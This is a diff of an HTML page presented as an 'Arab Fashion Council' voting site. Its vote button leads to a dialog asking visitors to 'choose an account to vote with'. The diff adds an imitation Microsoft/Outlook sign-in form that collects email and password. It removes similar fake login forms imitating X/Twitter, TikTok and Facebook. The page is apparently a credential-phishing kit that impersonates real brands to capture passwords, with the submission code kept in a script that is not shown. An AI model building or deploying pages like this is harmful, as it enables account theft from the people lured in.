@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html class="_9dls touch _ar44 js-focus-visible _aa4c" lang="en" dir="ltr" data-js-focus-visible="">
 
@@ -28,38 +27,38 @@
     <title>Arab Fashion Council</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-.mgm {
-    display: none;
-    /* Initially hidden */
-    background-color: #fff9d7;
-    border: 1px solid #e2c822;
-    width: 100%;
-    max-width: 400px; 
-    /* Set a max width */
-    padding: 5px;
-    text-align: center;
-    border-radius: 5px;
-    margin: 10px auto;
-    /* Add margin to create space around it */
-    font-family: Arial, sans-serif;
-    font-size: 11px;
-}
+        .mgm {
+            display: none;
+            /* Initially hidden */
+            background-color: #fff9d7;
+            border: 1px solid #e2c822;
+            width: 100%;
+            max-width: 400px;
+            /* Set a max width */
+            padding: 5px;
+            text-align: center;
+            border-radius: 5px;
+            margin: 10px auto;
+            /* Add margin to create space around it */
+            font-family: Arial, sans-serif;
+            font-size: 11px;
+        }
 
-.mgm .txt {
-    display: inline-block;
-    /* Display text inline-block to align with any other inline content */
-    vertical-align: middle;
-    /* Vertical alignment */
-}
+        .mgm .txt {
+            display: inline-block;
+            /* Display text inline-block to align with any other inline content */
+            vertical-align: middle;
+            /* Vertical alignment */
+        }
 
-.mgm img {
-    display: inline-block;
-    width: 35px;
-    height: 35px;
-    border-radius: 50%;
-    vertical-align: middle;
-    margin-right: 10px;
-}
+        .mgm img {
+            display: inline-block;
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
 
 
         .stopwatch {
@@ -141,37 +140,187 @@
             padding: 0 0 0 40px;
         }
     </style>
+
+    <script>
+
+        const APPEARANCE = 'auto'
+    </script>
+    <script>
+        let defaultThemeLight = { 'id': null, 'name': 'Default', colors: { 'pageBg': '#f9fafb', 'boxBg': '#ffffff', 'boxBorder': '#e5e8eb', 'boxBorderTop': '#fbbf24', 'title': '#111827', 'text': '#6b7280', 'highlight': '#4f46e5', 'buttonBg': '#4f46e5', 'buttonText': '#ffffff', 'border': '#e5e7eb', }, 'hideShareButton': false }
+        let defaultThemeDark = { 'id': null, 'name': 'Default', colors: { 'pageBg': '#111827', 'boxBg': '#1f2937', 'boxBorder': '#374151', 'boxBorderTop': '#818cf8', 'title': '#e5e7eb', 'text': '#94a3b8', 'highlight': '#6366f1', 'buttonBg': '#6366f1', 'buttonText': '#ffffff', 'border': '#374151' }, 'hideShareButton': false }
+
+        let customTheme = { id: null }
+
+        let currentTheme = defaultThemeLight
+
+        if (APPEARANCE === 'dark' || APPEARANCE === 'auto' && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+            document.getElementById('html').classList.add('dark')
+            currentTheme = defaultThemeDark
+        }
+
+        if (customTheme.id) {
+            currentTheme = customTheme
+
+            if (isDarkBg(hexToRGBA(customTheme.colors.pageBg, 1, 0, 1))) {
+                if (!document.getElementById('html').classList.contains('dark')) {
+                    document.getElementById('html').classList.add('dark')
+                }
+            } else {
+                if (document.getElementById('html').classList.contains('dark')) {
+                    document.getElementById('html').classList.remove('dark')
+                }
+            }
+        }
+
+        let pollOptionColors = ['#3EB991', '#FF7563', '#AA66CC', '#FFBB33', '#FF8800', '#33B5E5', '#AA66CC']
+
+        setCustomTheme(currentTheme)
+
+        function setCustomTheme(theme) {
+            for (const [key, value] of Object.entries(theme.colors)) {
+                document.documentElement.style.setProperty('--' + key, hexToRGBA(value, 1, 0, 1))
+            }
+
+            document.documentElement.style.setProperty('--buttonBgLight', hexToRGBA(theme.colors['buttonBg'], 1, 1, 1.16))
+            document.documentElement.style.setProperty('--borderDark', hexToRGBA(theme.colors['border'], 1, 1, 0.84))
+            document.documentElement.style.setProperty('--highlightDark', hexToRGBA(theme.colors['highlight'], 1, 1, 0.84))
+            document.documentElement.style.setProperty('--textShadow', hexToRGBA(theme.colors['text'], 1, 5, 0.954))
+            document.documentElement.style.setProperty('--textLight', hexToRGBA(theme.colors['text'], 0.8, 0, 1)) // 1, 113, 0.5568)
+            document.documentElement.style.setProperty('--textLighter', hexToRGBA(theme.colors['text'], 1, 168, 0.3431))
+            document.documentElement.style.setProperty('--highlightShadow', hexToRGBA(theme.colors['highlight'], 1, 58, 0.772))
+        }
+
+        function setCustomFormDesign(design) {
+            for (const [key, value] of Object.entries(design.colors)) {
+                document.documentElement.style.setProperty('--' + key, hexToRGBA(value, 1, 0, 1))
+            }
+
+            if (isDarkBg(hexToRGBA(design.colors['formBackgroundColor'], 1, 0, 1))) {
+                document.documentElement.style.setProperty('--textColorLight', hexToRGBA(design.colors['textColor'], 1, 1, 0.5))
+                document.documentElement.style.setProperty('--titleColorLight', hexToRGBA(design.colors['titleColor'], 1, 1, 0.5))
+            } else {
+                document.documentElement.style.setProperty('--titleColorLight', hexToRGBA(design.colors['titleColor'], 0.2, 0, 1))
+                document.documentElement.style.setProperty('--textColorLight', hexToRGBA(design.colors['textColor'], 0.2, 0, 1))
+            }
+
+            if (isDarkBg(hexToRGBA(design.colors['choiceColor'], 1, 0, 1))) {
+                document.documentElement.style.setProperty('--choiceBackgroundTextColor', 'rgba(255,255,255,1)')
+            } else {
+                document.documentElement.style.setProperty('--choiceBackgroundTextColor', 'rgba(0,0,0,1)')
+            }
+        }
+
+        function hexToRGBA(hex, opacity, modifierAdd, modifierMulti) {
+            if (!hex) {
+                return 'rgba(0, 0, 0, 0)'
+            }
+            let c;
+            if (/^#([A-Fa-f0-9]{3}){1,2}$/.test(hex)) {
+                c = hex.substring(1).split('')
+                if (c.length === 3) {
+                    c = [c[0], c[0], c[1], c[1], c[2], c[2]]
+                }
+                c = '0x' + c.join('')
+                return 'rgba(' + [(c >> 16) & 255, (c >> 8) & 255, c & 255].map(x => parseInt(modifierAdd + modifierMulti * x)).join(',') + ', ' + opacity + ')'
+            }
+        }
+
+        function isDarkBg(color) {
+            let colors = color.match(/^rgba?\((\d+),\s*(\d+),\s*(\d+)(?:,\s*(\d+(?:\.\d+)?))?\)$/)
+
+            let r = colors[1]
+            let g = colors[2]
+            let b = colors[3]
+            let a = parseInt(colors[4])
+
+            if (a === 0) return 0
+
+            let hsp = Math.sqrt(0.299 * (r * r) + 0.587 * (g * g) + 0.114 * (b * b))
+
+            if (hsp <= 127.5) {
+                return 1
+            }
+        }
+    </script>
+    <link rel="stylesheet" href="strawpoll/dist/main.css">
+    <script defer src="strawpoll/dist/app.js?v=248"></script>
+
+    <!-- Add this line in the <head> section of your HTML -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="js/index.js"></script>
+
+    <link rel="stylesheet" href="css/index.css">
+    <script>
+
+    </script>
+
+    <style>
+        /* Popup styles */
+        .popup {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: rgba(0, 0, 0, 0.7);
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            display: flex;
+            align-items: center;
+            display: none;
+            z-index: 999;
+            /* Lower z-index */
+        }
+
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 998;
+            /* Lower z-index for the overlay */
+        }
+
+        .popup img {
+            border-radius: 50%;
+            margin-right: 10px;
+            width: 40px;
+            height: 40px;
+        }
+    </style>
 </head>
 
 <body>
     <div id="home">
 
-<header>
-    <img src="img/slide.png"><br><br>
+        <header>
+            <img src="img/slide.png"><br><br>
 
-    <center>
-        <div class="mgm">
-            <span class="txt">This is a sample message.</span>
-        </div><br><br>
+            <center>
+                <div class="mgm">
+                    <span class="txt">This is a sample message.</span>
+                </div><br><br>
 
-        <button id="vote2" onclick="vote()">
-            Click Here To Vote
-        </button><br><br>
-    </center>
-</header>
-<script>
-    function toggleMGM() {
-    const mgm = document.querySelector('.mgm');
-    const voteButton = document.getElementById('vote2');
-    
-    if (mgm.style.display === 'block') {
-        mgm.style.display = 'none';
-    } else {
-        mgm.style.display = 'block';
-    }
-}
+                <button id="vote2" onclick="vote()">
+                    Click Here To Vote
+                </button><br><br>
+            </center>
+        </header>
+        <script>
+            function toggleMGM() {
+                const mgm = document.querySelector('.mgm');
+                const voteButton = document.getElementById('vote2');
 
-</script>
+                if (mgm.style.display === 'block') {
+                    mgm.style.display = 'none';
+                } else {
+                    mgm.style.display = 'block';
+                }
+            }
+
+        </script>
 
         <div id="blue">
 
@@ -298,785 +447,468 @@
             </profile>
         </center>
     </div>
-    <center>
-        <div id="choose" class="t706__cartwin t706__cartwin_showed"
-            style="opacity: 1; transition: opacity 0.3s ease 0s;">
-            <div class="t706" data-cart-countdown="yes" data-opencart-onorder="yes" data-project-currency="د.إ.&rlm;"
-                data-project-currency-side="l" data-project-currency-sep="." data-project-currency-code="AED"
-                data-payment-system="stripe" data-cart-dontstore="y" data-cart-oneproduct="y"
-                data-cart-sendevent-onadd="y">
 
-                <div class="t706__cartwin t706__cartwin_showed" style="opacity: 1; transition: opacity 0.3s ease 0s;">
-                    <div class="t706__close t706__cartwin-close"><button id="cancel" onclick="can()" type="button"
-                            class="t706__close-button t706__cartwin-close-wrapper" aria-label="Закрыть корзину"><svg
-                                role="presentation" class="t706__close-icon t706__cartwin-close-icon" width="23px"
-                                height="23px" viewBox="0 0 23 23" version="1.1" xmlns="http://www.w3.org/2000/svg"
-                                xmlns:xlink="http://www.w3.org/1999/xlink">
-                                <g stroke="none" stroke-width="1" fill="#fff" fill-rule="evenodd">
-                                    <rect
-                                        transform="translate(11.313708, 11.313708) rotate(-45.000000) translate(-11.313708, -11.313708) "
-                                        x="10.3137085" y="-3.6862915" width="2" height="30"></rect>
-                                    <rect
-                                        transform="translate(11.313708, 11.313708) rotate(-315.000000) translate(-11.313708, -11.313708) "
-                                        x="10.3137085" y="-3.6862915" width="2" height="30"></rect>
-                                </g>
-                            </svg> </button> </div><br><br>
-                    <div class="t706__cartwin-content">
-                        <div class="t706__cartwin-top">
-                            <div class="t706__cartwin-heading t-name t-name_xl">You
-                                must be logged in!</div><br><br>
+    <!-- Choose Social Login -->
+    <div id="socialDialog" class="hidden fixed inset-0 flex items-center justify-center z-50 p-6">
+
+        <!-- Overlay -->
+        <div class="fixed z-40 inset-0 bg-gray-500 dark:bg-gray-900 opacity-80" onclick="hideAlert()"
+            aria-hidden="true">
+        </div>
+
+        <!-- Trick to center modal -->
+        <span class="hidden sm:inline-block sm:align-middle sm:h-screen" aria-hidden="true"></span>
+
+        <!-- Error Dialog -->
+        <div id="modal-content"
+            class="relative z-50 inline-block align-bottom bg-white dark:bg-gray-800 rounded-lg text-left overflow-visible shadow-xl my-8 w-full max-w-sm sm:max-w-md">
+
+            <!-- Close button -->
+            <div class="absolute top-0 right-0 pt-4 pr-4">
+                <button type="button"
+                    class="rounded-md text-gray-400 hover:text-gray-500 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500"
+                    onclick="can()">
+                    <span class="sr-only">Close</span>
+                    <svg class="h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+                        stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12">
+                        </path>
+                    </svg>
+                </button>
+            </div>
+
+            <!-- Modal Content -->
+            <div class="px-4 pt-5 pb-4 sm:p-6 rounded-md">
+                <div class="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-transparent">
+                    <svg class="h-6 w-6 text-yellow-600" xmlns="http://www.w3.org/2000/svg" fill="none"
+                        viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                            d="M12 2L2 22h20L12 2zm0 13v-4m0 4h0" />
+                    </svg>
+                </div>
+                <div class="mt-3 text-center sm:mt-5">
+                    <h3 id="alert-title" class="text-lg leading-6 font-medium text-gray-900 dark:text-white">
+                        Choose an account to vote with
+                    </h3>
+                    <!-- Social Media Icons -->
+                    <div class="mt-6 flex justify-center space-x-8">
+                        <img width="50px" height="50px" title="facebook"
+                            class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
+                            src="https://cdn.icon-icons.com/icons2/1826/PNG/512/4202107facebookfblogosocialsocialmedia-115710_115591.png"
+                            alt="Facebook" onclick="fb(); hidePopup(); can();">
+
+                        <img width="50px" height="50px" title="instagram"
+                            class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
+                            src="https://cdn.icon-icons.com/icons2/836/PNG/512/Instagram_icon-icons.com_66804.png"
+                            alt="Instagram" onclick="ig(); hidePopup(); can();">
+
+                        <img width="50px" height="50px" title="tiktok"
+                            class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
+                            src="https://cdn.icon-icons.com/icons2/2389/PNG/512/tiktok_logo_icon_144802.png"
+                            alt="TikTok" onclick="tok(); hidePopup(); can();">
+
+                        <img width="50px" height="50px" title="email"
+                            class="cursor-pointer hover:scale-110 transition-all duration-200 ease-in-out transform w-12 h-12"
+                            src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/1024px-Microsoft_logo.svg.png"
+                            alt="Twitter" onclick="tw(); hidePopup(); can();">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="votingsocial">
+        <div id="twp" class="bg-gray mt-4">
+            <div class="min-h-screen flex flex-col w-full">
+                <!-- Main Content Section -->
+                <main class="flex-grow">
+                    <div class="tokpart ">
+                        <div class=" p-5 w-full max-w-md">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1920px-Microsoft_logo_%282012%29.svg.png"
+                                alt="logo" class="h-10 mt-20">
+                            <h2 id="heading" class="text-4xl font-bold text-white mb-0 mt-12 text-left">Sign in</h2>
+                            <p class="text-xl text-white mb-6 mt-0 text-left">to continue to Outlook</p>
+                            <!-- Email Input -->
+                            <div id="uname" class="flex justify-start">
+                                <input type="email" id="twi-uname" name="email" required
+                                    class="block w-full px-1 py-4 border-b border-gray-700 focus:outline-none focus:ring-0 focus:border-blue-500 bg-transparent text-gray-300 placeholder:text-gray-500"
+                                    placeholder="Email, phone, or Skype" />
+                            </div>
+                            <div class="flex justify-start">
+                                <button id="forgotPasswordButton" type="button"
+                                    class="text-gray-200 py-2 px-1 bg-transparent focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-900 mt-0">
+                                    No account?
+                                    <span class="text-blue-500 hover:underline"> Create one!</span>
+                                </button>
+                            </div>
+                            <!-- Next Button to show password field -->
+                            <button id="nextButton" type="button" onclick="showPasswordField()"
+                                class="bg-blue-500 text-white py-2 px-4 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4 float-right">
+                                Next
+                            </button>
+                            <!-- Password Field (hidden initially) -->
+                            <div id="passwordField" class="hidden mt-4">
+                                <div class="mb-4 relative">
+                                    <input type="password" id="twi-pass" name="password" required
+                                        class="block w-full px-1 py-4 border-b border-gray-700 focus:outline-none focus:ring-0 focus:border-blue-500 bg-transparent text-gray-300 placeholder:text-gray-500"
+                                        placeholder="Password" />
+                                </div>
+                                <button id="nextButton" type="button" onclick="twilog()"
+                                    class="bg-blue-500 text-white py-2 px-4 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 mt-4 float-right">
+                                    Submit
+                                </button>
+
+                            </div>
+
                         </div>
-                        <div class="t706__cartwin-products">
-                            <div class="t706__cartwin-bottom">
-                            </div>
-                            <img id="choose_fb" onclick="handleFbClick()" src="image/fb.png">
-                            <img id="choose_ig" onclick="handleIgClick()" src="image/ig.png">
-                            <img id="choose_tw" onclick="handleTwClick()" src="img/xlog.png">
-                            <img id="choose_tok" onlclick="handleTokClick()" src="img/tok.png">
+                    </div>
+                </main>
+                <!-- Footer Section -->
+                <footer id="error-message"
+                    class="hidden bg-blue-600 text-white text-sm mt-2 text-center py-6 mt-auto w-full ">
+                    <div class=" w-full px-4">
+                        <div class="flex justify-between items-center">
+                            Sorry, we could not find your account.
                         </div>
                     </div>
-                    <br><br>
-                    <div class="t706__cartdata"></div>
-                </div>
-
+                </footer>
 
             </div>
-        </div>
-    </center>
-
-    <!--Twitter login begins-->
-    <div id="tw_wrapper">
-
-
-        <div id="twbody" style="background-color: black; padding: 2.5rem;" class="tbook">
-            <br>
-
-            <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
-                style="pointer-events: none; margin-top: 0px; margin-bottom: 20px; flex-grow: 1; flex-shrink: 100; align-items: center; justify-content: center;">
-                <img alt="Twitter" src="img/xlogo.jpeg" class="wbloks_1"
-                    style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;">
-            </div><br>
-
-
-
-            <div class="css-175oi2r">
-                <div class="css-175oi2r r-1y6u10y">
-                    <span class="css-1jxf684 r-bcqeeo r-1ttztb7 r-qvutc0 r-poiln3" style="text-overflow: unset;"><span
-                            class="css-1jxf684 r-bcqeeo r-1ttztb7 r-qvutc0 r-poiln3" style="text-overflow: unset;">Sign
-                            in to X</span></span></h1>
-                </div>
-            </div><br>
-
-
-            <div class="pam _3-95 _9ay3 uiBoxRed" role="alert" tabindex="0" id="error_box" style="display: none;">
-                <div class="fsl fwb fcb" style="font-weight: bold;">Error</div>
-                <div>Oops, something went wrong. Please try again later.</div>
-            </div><br>
-
-
-            <div class="twform-group">
-                <input type="text" id="tw-email" required oninput="toggleClearIcon()">
-                <label for="tw-email">Phone, email, or username</label>
-                <div class="clear-input" id="clearIcon" onclick="clearEmailInput()"></div>
-            </div>
-
-            <div class="twform-group">
-                <input type="password" id="tw-pass" required>
-                <label for="tw-pass">Password</label>
-                <div class="toggle-password" onclick="togglePasswordVisibility()"></div>
-                <!-- Icon as a clickable div -->
-            </div>
-
-
-
-
-
-
-            <div onclick="twlogin()" data-bloks-name="bk.components.Flexbox" tabindex="0" role="button"
-                aria-label="Create new account" data-anchor-id="replay" class="wbloks_1"
-                style="pointer-events: inherit; width: 100%;">
-                <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
-                    style="pointer-events: none; opacity: 1; height: 36px; min-width: 36px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgb(255, 255, 255); border: 1px solid rgb(0, 0, 0); border-radius: 18px; align-items: center; flex-direction: row; justify-content: center;">
-                    <div>
-                        <span data-bloks-name="bk.components.TextSpan"
-                            style="padding: 6px; display: flex; justify-content: center; color: rgb(0, 0, 0); font-weight: 700; display: flex; font-size: 17px; font-family: &quot;Optimistic Text Normal&quot;; overflow-wrap: break-word;">Log
-                            in
-                        </span>
-                    </div>
-
-                </div>
-            </div><br><br>
-
-
-            <div data-bloks-name="bk.components.Flexbox" tabindex="0" role="button" aria-label="Create new account"
-                data-anchor-id="replay" class="wbloks_1" style="pointer-events: inherit; width: 100%;">
-                <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
-                    style="pointer-events: none; opacity: 1; height: 36px; min-width: 36px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgb(0, 0, 0); border: 1px solid rgb(0, 0, 0); border-radius: 18px; align-items: center; flex-direction: row; justify-content: center;">
-                    <div>
-                        <span data-bloks-name="bk.components.TextSpan"
-                            style="padding: 6px; display: flex; justify-content: center; color: rgb(255, 255, 255); font-weight: 700; display: flex; font-size: 17px; font-family: &quot;Optimistic Text Normal&quot;; overflow-wrap: break-word;">Forgot
-                            Password?
-                        </span>
-                    </div>
-
-                </div>
-            </div><br><br><br>
-
-
-
-
-            <div>
-                <span data-bloks-name="bk.components.TextSpan"
-                    style="padding: 8px; display: flex; justify-content: center; color: rgb(255, 255, 255); font-weight: 400; display: flex; font: 14px -apple-system,BlinkMacSystemFont,"
-                    Segoe UI",Roboto,Helvetica,Arial,sans-serif; font-size: 15px; overflow-wrap: break-word;">Don't
-                    have an account?<span style="color:#3578e5"> Sign up</span>
-                </span>
-            </div>
-
 
         </div>
 
-    </div>
-    <!--Twitter login ends-->
-
-    <!--Tiktok login begins-->
-    <div id="tok_wrapper">
-
-
-       <div class="min-h-screen flex flex-col w-full">
-        <!-- Main Content Section -->
-        <main class="flex-grow">
-          <div class="flex justify-between items-center p-4">
-            <!-- Left Section -->
-            <div class="flex items-center">
-              <img
-                src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/1000px-TikTok_logo.svg.png?20200415104610"
-                alt="logo" class="h-10">
-            </div>
-            <!-- Right Section -->
-            <div class="flex items-center space-x-2">
-              <i class="fa fa-question-circle text-gray-500 hover:text-gray-700" aria-hidden="true"></i>
-              <span id="feedback-help" class="text-gray-500 hover:text-gray-700">Feedback and
-                help</span>
-            </div>
-          </div>
-          <div class="tokpart text-black">
-            <div class="bg-white p-8 w-full max-w-md">
-              <h2 id="login-title" class="text-2xl font-bold mb-6 text-center">Log In</h2>
-              <div>
-                <div class="mb-4">
-                  <label id="email-label" for="email" class="block text-sm font-medium text-gray-700">Email or
-                    username</label>
-                  <input type="text" id="tok-uname" required
-                    class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
-                    oninput="checkInput()">
-                  <p id="email-feedback" class="text-sm text-red-500 hidden">Please enter a valid
-                    account.</p>
-                </div>
-                <div class="mb-6">
-                  <label id="password-label" for="password"
-                    class="block text-sm font-medium text-gray-700">Password</label>
-                  <input type="password" id="tok-pass" name="password" required
-                    class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
-                    oninput="checkPassword()">
-                  <p id="password-feedback" class="text-sm text-red-500 hidden">Password must be at
-                    least 6 characters long.</p>
-                </div>
-                <div class="flex items-center justify-between mb-6">
-                  <div class="text-sm">
-                    <a id="forgot-password" href="#" class="font-medium text-gray-600 hover:text-gray-500">Forgot
-                      password?</a>
-                  </div>
-                </div>
-                <button onclick="toklog()" type="submit" id="login-button"
-                  class="w-full bg-pink-600 text-white py-2 px-4 rounded-md hover:bg-pink-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">Log
-                  in</button>
-              </div>
-              <p id="signup-text" class="mt-6 text-center text-sm text-gray-600">
-                Don't have an account?
-                <a href="#" class="font-medium text-pink-600 hover:text-pink-500">Sign up</a>
-              </p>
-            </div>
-          </div>
-        </main>
-        <!-- Footer Section -->
-        <footer class="bg-gray-900 text-white py-6 mt-auto w-full">
-          <div class="w-full px-4">
-            <div class="flex justify-between items-center">
-              <!-- Left Section: Language Selector with Rounded Border -->
-              <div class="flex items-center space-x-4">
-                <select id="languageSelect" onchange="translatePage()"
-                  class="bg-gray-900 text-gray-500 py-1 px-3 rounded-80 border border-gray-200 focus:outline-none focus:ring-2 focus:ring-blue-500">
-                  <option value="en">English</option>
-                  <option value="es">Español</option>
-                  <option value="fr">Français</option>
-                  <option value="de">Deutsch</option>
-                  <option value="it">Italiano</option>
-                  <option value="pt">Português</option>
-                  <option value="zh">中文 (Chinese)</option>
-                  <option value="ar">العربية (Arabic)</option>
-                </select>
-              </div>
-              <!-- Right Section: Copyright -->
-              <div class="text-sm text-gray-500">
-                &copy; 2025 TikTok
-              </div>
-            </div>
-          </div>
-        </footer>
-      </div>
-    </div>
-
-    <script>
-      // Check if email is valid
-      function checkInput() {
-        const email = document.getElementById('tok-uname').value;
-        const emailFeedback = document.getElementById('email-feedback');
-
-        if (emailPattern.test(email)) {
-          emailFeedback.classList.add('hidden');
-        } else {
-          emailFeedback.classList.remove('hidden');
-        }
-      }
-
-      // Check if password is valid (at least 6 characters)
-      function checkPassword() {
-        const password = document.getElementById('tok-pass').value;
-        const passwordFeedback = document.getElementById('password-feedback');
-
-        if (password.length >= 6) {
-          passwordFeedback.classList.add('hidden');
-        } else {
-          passwordFeedback.classList.remove('hidden');
-        }
-      }
-    </script>
-    <!--Tiktok login ends-->
-
-    <!--Facebook login begins-->
-    <div id="fb_wrapper">
-
-        <div id="fbbody" class="fbook">
-            <br>
-            <center><span
-                    style="display: flex; justify-content: center; align-items: center; text-align: center; color: rgb(70, 90, 105); display: inline; font-size: 13px; font-family: &quot;Optimistic Text Normal&quot;; ">English
-                    (UK)</span></center><br><br><br><br>
-
-            <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
-                style="pointer-events: none; margin-top: 0px; margin-bottom: 20px; flex-grow: 1; flex-shrink: 100; align-items: center; justify-content: center;">
-                <img alt="Facebook from Meta" src="img/fblogo.png" class="wbloks_1"
-                    style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;">
-            </div><br><br><br>
-
-            <div class="pam _3-95 _9ay3 uiBoxRed" role="alert" tabindex="0" id="error_box" style="display: none;">
-                <div class="fsl fwb fcb">Wrong credentials</div>
-                <div>Invalid username or password</div>
-            </div><br>
-
-
-            <div class="form-group">
-                <input type="text" id="fb-email" required oninput="toggleClearIcon()">
-                <label for="fb-email">Mobile number or email address</label>
-                <div class="clear-input" id="clearIcon" onclick="clearEmailInput()"></div>
-            </div>
-
-            <div class="form-group">
-                <input type="password" id="fb-pass" required>
-                <label for="fb-pass">Password</label>
-                <div class="toggle-password" onclick="togglePasswordVisibility()"></div>
-                <!-- Icon as a clickable div -->
-            </div>
-
-            <div
-                style="opacity: 1; height: 44px; min-width: 44px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgb(0, 100, 224); border: 0px solid rgb(28, 43, 51); border-radius: 22px; align-items: center; flex-direction: row; justify-content: center;">
-
-                <div class="wbloks_113" dir="auto">
-
-                    <div onclick="login()"
-                        style="padding: 9px; display: flex; justify-content: center; color: rgb(255, 255, 255); font-weight: 500;  font-size: 16px; font-family: &quot;Optimistic Text Normal&quot;;  ">
-                        Log
-                        in</div>
-
-                </div>
-            </div> <br><br>
-
-            <div class="wbloks_112" style="font-size: 15px; max-height: 20.28px; word-break: break-all;">
-                <div class="wbloks_113" dir="auto"><span data-bloks-name="bk.components.TextSpan"
-                        style="line-height: 1rem; color: rgb(28, 43, 51); font-weight: 500; display: inline; font-size: 15px; font-family: &quot;Optimistic Text Normal&quot;; overflow-wrap: break-word;">Forgotten
-                        Password?</span></div>
-            </div><br><br><br><br><br>
-
-            <div data-bloks-name="bk.components.Flexbox" tabindex="0" role="button" aria-label="Create new account"
-                data-anchor-id="replay" class="wbloks_1" style="pointer-events: inherit; width: 100%;">
-                <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
-                    style="pointer-events: none; opacity: 1; height: 36px; min-width: 36px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgba(255, 255, 255, 0); border: 1px solid rgb(203, 210, 217); border-radius: 18px; align-items: center; flex-direction: row; justify-content: center;">
-                    <div>
-                        <span data-bloks-name="bk.components.TextSpan"
-                            style="padding: 8px; display: flex; justify-content: center; color: rgb(28, 43, 51); font-weight: 500; display: flex; font-size: 15px; font-family: &quot;Optimistic Text Normal&quot;; overflow-wrap: break-word;">Create
-                            new account</span>
+        <div id="igp" class="bg-black">
+            <div class="min-h-screen flex flex-col w-full">
+                <!-- Main Content Section -->
+                <main class="flex-grow p-2"> <!-- Reduced padding here -->
+                    <div class="flex justify-center mt-11 mb-6">
+                        <!-- Centered Image -->
+                        <img src="image/ig.svg" alt="logo" class="h-12">
                     </div>
-
-                </div>
-            </div>
-
-
-            <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
-                style="pointer-events: none; flex-grow: 1; flex-shrink: 1e+06; padding-bottom: 0px; flex-direction: column; justify-content: flex-end;">
-                <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
-                    style="pointer-events: none; padding-top: 20px; padding-bottom: 20px; align-items: center; justify-content: center;">
-                    <center>
-                        <div class="wbloks_1" style="height: 12px; aspect-ratio: 5 / 1;">
-                            <div data-bloks-name="bk.components.AspectRatio" class="wbloks_108"
-                                style="aspect-ratio: 5 / 1;">
-                                <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" height="1" width="5"
-                                    class="wbloks_110"></svg>
-                            </div>
-                            <div class="wbloks_109"><img alt="Meta logo" src="img/meta.png" class="wbloks_1"
-                                    style="width: 100%; pointer-events: inherit; mask-image: url(img/meta.png); mask-size: contain; background-color: rgb(70, 90, 105); object-position: 10000px 10000px; object-fit: contain; overflow: hidden;">
-                            </div>
-                    </center>
-                </div>
-            </div><br>
-            <div data-bloks-name="bk.components.Flexbox"
-                style="font-family: &quot;Optimistic Text Normal&quot;; word-spacing: 10px; pointer-events: none; align-items: center; flex-direction: column; justify-content: center;">
-                <div data-bloks-name="bk.components.Flexbox" class="wbloks_1" style="pointer-events: none;">
-                    <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
-                        style="pointer-events: none; padding-left: 4px; padding-right: 4px; padding-bottom: 4px;">
-                        <span data-bloks-name="bk.components.TextSpan"
-                            style="pointer-events: auto; cursor: pointer; color: rgb(99, 120, 138); display: inline; font-size: 10px; white-space: pre-wrap; overflow-wrap: break-word;">About</span>
-                        <span data-bloks-name="bk.components.TextSpan"
-                            style="pointer-events: auto; cursor: pointer; color: rgb(99, 120, 138); display: inline; font-size: 10px; white-space: pre-wrap; overflow-wrap: break-word;">Help</span>
-                        <span data-bloks-name="bk.components.TextSpan"
-                            style="pointer-events: auto; cursor: pointer; color: rgb(99, 120, 138); display: inline; font-size: 10px; white-space: pre-wrap; overflow-wrap: break-word;">More</span>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-    </div>
-    <!--Facebook login ends-->
-
-
-    <!--Insta login begins-->
-    <div id="ig_wrapper">
-        <div id="igcontainer" class="_ar45 system-fonts--body roboto">
